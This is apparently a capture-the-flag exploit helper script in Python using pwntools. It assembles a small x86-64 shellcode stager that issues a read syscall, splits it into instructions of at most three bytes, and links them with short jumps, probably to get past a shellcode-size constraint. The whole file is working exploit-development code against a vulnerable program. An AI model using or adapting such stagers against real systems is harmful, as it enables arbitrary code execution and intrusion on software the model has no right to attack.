#!/usr/bin/env python3

# type: ignore

from pwn import *

sc = """\
push rdx
pop rsi
xor edi, edi
xor eax, eax
pushf
pop rdx
syscall\
"""

# https://www.felixcloutier.com/x86/jmp
jmp_rel32 = b"\xe9"
jmp_rel8 = b"\xeb"

print(jmp_rel8 + b"\x01")
for i in sc.split("\n"):
    b = asm(i, arch="amd64", os="linux")
    if len(b) > 3:
        print(f"{i} is more than 3 bytes")
        break
    if len(b) == 1:
        b += b"\x90"
    b += jmp_rel8 + b"\x01"
    print(jmp_rel32 + b)
